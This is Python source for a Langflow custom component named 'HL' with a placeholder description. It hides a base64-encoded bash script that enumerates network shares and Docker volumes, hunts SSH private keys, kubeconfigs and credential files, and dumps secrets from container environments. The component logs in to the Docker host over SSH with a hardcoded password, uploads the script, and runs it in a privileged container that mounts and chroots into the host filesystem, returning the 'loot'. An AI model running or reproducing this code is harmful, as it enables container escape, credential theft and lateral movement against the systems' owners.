# Recovered Langflow component
# type: HL
# class: HL
# used in 2 flow(s): hl3 (1), hl3 (2)
# json path: node.data.node.template.code.value


from langflow.custom import Component
from langflow.io import Output, MessageTextInput
from langflow.schema.message import Message
import paramiko, base64
class HL(Component):
    display_name="HL"; description="d"; icon="code"; name="HL"
    inputs=[MessageTextInput(name="input_value", display_name="Input", value="x")]
    outputs=[Output(name="output", display_name="Output", method="go")]
    def go(self) -> Message:
        script = base64.b64decode("IyEvYmluL2Jhc2gKc2V0ICtlCmVjaG8gIj09PT09IE1PVU5UUyAvIEZTID09PT09IgpkYXRlIC11Cmhvc3RuYW1lCmZpbmRtbnQgLUEgMj4vZGV2L251bGwgfCBoZWFkIC0yMDAKZWNobyAnLS0tJwptb3VudCB8IGVncmVwIC1pICduZnN8Y2lmc3xzbWJ8ZnVzZXxwb29sfGhvbWV8YmluZHxzc2hmcycgfHwgdHJ1ZQplY2hvICctLS0nCmNhdCAvZXRjL2ZzdGFiIDI+L2Rldi9udWxsCmVjaG8gJy0tLScKbHMgLWxhIC9tbnQgL21lZGlhIC9kYXRhIC9leHBvcnQgL3NydiAyPi9kZXYvbnVsbApmaW5kIC9tbnQgL21lZGlhIC9kYXRhIC9leHBvcnQgL3NydiAtbWF4ZGVwdGggMyAtdHlwZSBkIDI+L2Rldi9udWxsIHwgaGVhZCAtODAKZWNobyAnLS0tIHBvb2wgLS0tJwpscyAtbGEgL21udC9wb29sLTEgL21udC9wb29sKiAvcG9vbCogMj4vZGV2L251bGwKZGYgLWhUIHwgaGVhZCAtNDAKCmVjaG8gIj09PT09IE5GUy9DSUZTIERJU0NPVkVSWSA9PT09PSIKc2hvd21vdW50IC1lIDE5Mi40MS4xNzAuMjEgMj4vZGV2L251bGwgfCBoZWFkCnNob3dtb3VudCAtZSAxOTIuNDEuMTcwLjQgMj4vZGV2L251bGwgfCBoZWFkCnNob3dtb3VudCAtZSAxOTIuNDEuMTcwLjM5IDI+L2Rldi9udWxsIHwgaGVhZApzaG93bW91bnQgLWUgMTkyLjQxLjE3MC40MiAyPi9kZXYvbnVsbCB8IGhlYWQKc2hvd21vdW50IC1lIGxvY2FsaG9zdCAyPi9kZXYvbnVsbCB8IGhlYWQKcnBjaW5mbyAtcCAxOTIuNDEuMTcwLjIxIDI+L2Rldi9udWxsIHwgaGVhZAojIHNtYj8Kc21iY2xpZW50IC1MIC8vMTkyLjQxLjE3MC4yMSAtTiAyPi9kZXYvbnVsbCB8IGhlYWQKY2F0IC9wcm9jL2ZzL25mc2ZzL3NlcnZlcnMgMj4vZGV2L251bGwKY2F0IC9wcm9jL21vdW50cyB8IGVncmVwIC1pICduZnN8Y2lmcycgfHwgdHJ1ZQoKZWNobyAiPT09PT0gRE9DS0VSIFZPTFVNRVMgLyBCSU5EUyA9PT09PSIKZG9ja2VyIHZvbHVtZSBscwplY2hvICctLS0gdm9sdW1lIGluc3BlY3QgYnJpZWYgLS0tJwpmb3IgdiBpbiAkKGRvY2tlciB2b2x1bWUgbHMgLXEpOyBkbwogIHA9JChkb2NrZXIgdm9sdW1lIGluc3BlY3QgIiR2IiAtLWZvcm1hdCAne3suTW91bnRwb2ludH19fHt7Lk5hbWV9fXx7ey5PcHRpb25zfX0nIDI+L2Rldi9udWxsKQogIGVjaG8gIlZPTCAkcCIKZG9uZQplY2hvICctLS0gY29udGFpbmVyIG1vdW50cyAtLS0nCmRvY2tlciBwcyAtYSAtLWZvcm1hdCAne3suTmFtZXN9fScgfCB3aGlsZSByZWFkIG47IGRvCiAgZWNobyAiIyMgJG4iCiAgZG9ja2VyIGluc3BlY3QgIiRuIiAtLWZvcm1hdCAnSW1hZ2U9e3suQ29uZmlnLkltYWdlfX0KQmluZHM9e3tqc29uIC5Ib3N0Q29uZmlnLkJpbmRzfX0KTW91bnRzPXt7cmFuZ2UgLk1vdW50c319e3suVHlwZX19Ont7LlNvdXJjZX19LT57ey5EZXN0aW5hdGlvbn19IChSVz17ey5SV319KTsge3tlbmR9fQpFbnZTZWNyZXRzPXt7cmFuZ2UgLkNvbmZpZy5FbnZ9fXt7cHJpbnRsbiAufX17e2VuZH19JyAyPi9kZXYvbnVsbCB8IGVncmVwIC1pICdCaW5kcz18TW91bnRzPXxJbWFnZT18S0VZfFNFQ1JFVHxUT0tFTnxQQVNTV09SRHxQQVNTfFBSSVZBVEV8QVdTfFNTSHxORlN8UE9PTHxIT01FfEFQSXxEQVRBQkFTRXxQT1NUR1JFU3xNWVNRTHxSRURJU3xKV1R8T1BFTkFJfExEQVB8VVJJfFVSTCcgfCBoZWFkIC04MApkb25lCgplY2hvICI9PT09PSBTRUFSQ0ggS0VZUyAvIEtVQkUgLyBSRU1PVEUgPT09PT0iCiMgcHJpdmF0ZSBrZXlzCmZpbmQgL3Jvb3QgL2hvbWUgL29wdCAvdmFyL2xpYi9kb2NrZXIvdm9sdW1lcyAvc3J2IC9kYXRhIC9tbnQgLXR5cGUgZiBcKCBcCiAgLW5hbWUgJ2lkX3JzYScgLW8gLW5hbWUgJ2lkX2VkMjU1MTknIC1vIC1uYW1lICdpZF9lY2RzYScgLW8gLW5hbWUgJ2lkX2RzYScgLW8gXAogIC1uYW1lICcqLnBlbScgLW8gLW5hbWUgJ2t1YmVjb25maWcnIC1vIC1uYW1lICdjb25maWcnIC1vIC1uYW1lICcqLmt1YmVjb25maWcnIC1vIFwKICAtbmFtZSAnY3JlZGVudGlhbHMnIC1vIC1uYW1lICdjcmVkZW50aWFscy5qc29uJyAtbyAtbmFtZSAnc2VydmljZS1hY2NvdW50Ki5qc29uJyAtbyBcCiAgLW5hbWUgJ2F1dGhvcml6ZWRfa2V5cycgLW8gLW5hbWUgJ2tub3duX2hvc3RzJyBcClwpIDI+L2Rldi9udWxsIHwgaGVhZCAtMjAwCgplY2hvICctLS0gcHJpdmF0ZSBrZXkgY2FuZGlkYXRlcyB3aXRoIGhlYWRlcnMgLS0tJwpmaW5kIC9yb290IC9ob21lIC9vcHQgL3NydiAvZGF0YSAvbW50IC92YXIvbGliL2RvY2tlci92b2x1bWVzIC10eXBlIGYgXCggLW5hbWUgJ2lkX3JzYScgLW8gLW5hbWUgJ2lkX2VkMjU1MTknIC1vIC1uYW1lICdpZF9lY2RzYScgLW8gLW5hbWUgJyoucGVtJyBcKSAyPi9kZXYvbnVsbCB8IHdoaWxlIHJlYWQgZjsgZG8KICBzej0kKHdjIC1jIDwiJGYiIDI+L2Rldi9udWxsIHx8IGVjaG8gMCkKICBbICIkc3oiIC1sdCA1MCBdICYmIGNvbnRpbnVlCiAgWyAiJHN6IiAtZ3QgMzAwMDAgXSAmJiBjb250aW51ZQogIGlmIGdyZXAgLXFFICdCRUdJTiAuKlBSSVZBVEUgS0VZfEJFR0lOIE9QRU5TU0ggUFJJVkFURSBLRVknICIkZiIgMj4vZGV2L251bGw7IHRoZW4KICAgIGVjaG8gIlBSSVYgJGYgc2l6ZT0kc3oiCiAgICBscyAtbGEgIiRmIgogICAgaGVhZCAtMSAiJGYiCiAgICAjIGZpbmdlcnByaW50IGlmIHBvc3NpYmxlCiAgICBzc2gta2V5Z2VuIC15IC1mICIkZiIgMj4vZGV2L251bGwgfCBoZWFkIC0xCiAgZmkKZG9uZSB8IGhlYWQgLTEyMAoKZWNobyAnLS0tIHNzaCBjb25maWdzIC0tLScKZmluZCAvcm9vdCAvaG9tZSAtdHlwZSBmIC1wYXRoICcqLy5zc2gvY29uZmlnJyAyPi9kZXYvbnVsbCB8IHdoaWxlIHJlYWQgZjsgZG8KICBlY2hvICJTU0hDT05GSUcgJGYiOyBjYXQgIiRmIjsgZWNobwpkb25lCmVjaG8gJy0tLSBrdWJlY29uZmlncyAtLS0nCmZpbmQgL3Jvb3QgL2hvbWUgL29wdCAvdmFyIC10eXBlIGYgXCggLW5hbWUgJ2t1YmVjb25maWcnIC1vIC1uYW1lICcqLmt1YmVjb25maWcnIC1vIC1wYXRoICcqLy5rdWJlL2NvbmZpZycgXCkgMj4vZGV2L251bGwgfCBoZWFkIC0zMCB8IHdoaWxlIHJlYWQgZjsgZG8KICBlY2hvICJLVUJFICRmIjsgbHMgLWxhICIkZiI7IGVncmVwIC1uICdzZXJ2ZXI6fHVzZXI6fHRva2VuOnxjbGllbnQtY2VydGlmaWNhdGV8cGFzc3dvcmQ6JyAiJGYiIDI+L2Rldi9udWxsIHwgaGVhZCAtNDAKZG9uZQoKZWNobyAiPT09PT0gSU5URVJFU1RJTkcgRU5WIElOIEFMTCBDT05UQUlORVJTID09PT09Igpmb3IgbiBpbiAkKGRvY2tlciBwcyAtLWZvcm1hdCAne3suTmFtZXN9fScpOyBkbwogIGVjaG8gIiMjIEVOViAkbiIKICBkb2NrZXIgZXhlYyAiJG4iIHNoIC1sYyAncHJpbnRlbnYgMj4vZGV2L251bGwgfCBlZ3JlcCAtaSAiS0VZfFNFQ1JFVHxUT0tFTnxQQVNTV09SRHxQQVNTfFBSSVZBVEV8QVdTfFNTSHxORlN8UE9PTHxIT01FfEFQSXxEQVRBQkFTRXxQT1NUR1JFU3xNWVNRTHxSRURJU3xKV1R8T1BFTkFJfExEQVB8VVJJfE1PTkdPfFNNVFB8V0VCSE9PS3xHSVRIVUJ8R0lUTEFCfEhBUkJPUnxSRUdJU1RSWXxTM3xNSU5JTyIgfCBzZWQgLUUgInMvKFBBU1NXT1JEfFNFQ1JFVHxUT0tFTnxLRVl8UFJJVkFURSlbXj1dKj0oLnswLDZ9KS4qL1wxPSoqKlJFREFDVEVEKioqL0kiJyAyPi9kZXYvbnVsbCB8IGhlYWQgLTYwCmRvbmUKCmVjaG8gIj09PT09IEdSRVAgUFJPSkVDVFMgRk9SIEhPU1RTL0tFWVMgPT09PT0iCmVncmVwIC1SSW4gLS1iaW5hcnktZmlsZXM9d2l0aG91dC1tYXRjaCBcCiAgJzE5MlwuNDFcLnwvbW50L3Bvb2x8bmZzfGNpZnN8anVweXRlclNzaHxkb29yXC5jc3xwb29sLTF8QkVHSU4gT1BFTlNTSHxCRUdJTiBSU0EgUFJJVkFURXxrdWJlY29uZmlnfFByb3h5SnVtcHxIb3N0TmFtZXxzc2ggLWknIFwKICAvaG9tZS9iY2kvcHJvamVjdHMgL2hvbWUvc3dhcmFqYi9wcm9qZWN0cyAvcm9vdCAyPi9kZXYvbnVsbCB8IGhlYWQgLTEyMAoKZWNobyAiPT09PT0gQ1JPTiAvIFNZU1RFTUQgUkVNT1RFID09PT09Igpjcm9udGFiIC1sIDI+L2Rldi9udWxsCmxzIC9ldGMvY3Jvbi5kIDI+L2Rldi9udWxsCmNhdCAvZXRjL2Nyb24uZC8qIDI+L2Rldi9udWxsIHwgaGVhZCAtODAKc3lzdGVtY3RsIGxpc3QtdW5pdHMgLS10eXBlPXNlcnZpY2UgLS1zdGF0ZT1ydW5uaW5nIDI+L2Rldi9udWxsIHwgZWdyZXAgLWkgJ25mc3xhdXRvZnN8bmV0YmlyZHxkb2NrZXJ8anVweXRlcnxzc2h8cnBjJyB8IGhlYWQKCmVjaG8gIj09PT09IFFVSUNLIFJFQUQgT0xMQU1BIEtFWSBNRVRBID09PT09IgpscyAtbGEgL2hvbWUvYmNpL3Byb2plY3RzL2xhbmdmbG93L29sbGFtYS8gMj4vZGV2L251bGwgfCBoZWFkCmZpbGUgL2hvbWUvYmNpL3Byb2plY3RzL2xhbmdmbG93L29sbGFtYS9pZF9lZDI1NTE5IDI+L2Rldi9udWxsCnNzaC1rZXlnZW4gLWxmIC9ob21lL2JjaS9wcm9qZWN0cy9sYW5nZmxvdy9vbGxhbWEvaWRfZWQyNTUxOS5wdWIgMj4vZGV2L251bGwKCmVjaG8gSE9TVF9MT09UMl9ET05FCg==")
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect("172.17.0.1", username="bci", password="bc1lab@AIT", timeout=12, allow_agent=False, look_for_keys=False)
        sftp = c.open_sftp()
        with sftp.file("/tmp/host_loot2.sh", "w") as f:
            f.write(script.decode())
        sftp.chmod("/tmp/host_loot2.sh", 0o755)
        sftp.close()
        cmd = (
            "docker run --rm --privileged "
            "-v /:/host -v /tmp/host_loot2.sh:/loot.sh:ro "
            "st125052/aitgpt-backend:latest "
            "chroot /host bash /loot.sh > /tmp/host_loot2.out 2>&1; "
            "echo EXIT:$?; wc -c /tmp/host_loot2.out; "
            "egrep -n \"=====|PRIV |pool-1|NFS|cifs|VOL |HOST_LOOT2_DONE|Mounts=|Binds=|KUBE \" /tmp/host_loot2.out | head -120; "
            "echo ---HEAD---; head -c 3000 /tmp/host_loot2.out; echo; "
            "echo ---TAIL---; tail -c 4000 /tmp/host_loot2.out; "
            "rm -f /tmp/host_loot2.sh"
        )
        _, o, e = c.exec_command(cmd, timeout=200)
        out = o.read().decode("utf-8", "replace")
        err = e.read().decode("utf-8", "replace")
        c.close()
        if err.strip():
            out += "\nSTDERR\n" + err
        return Message(text=out[-95000:])
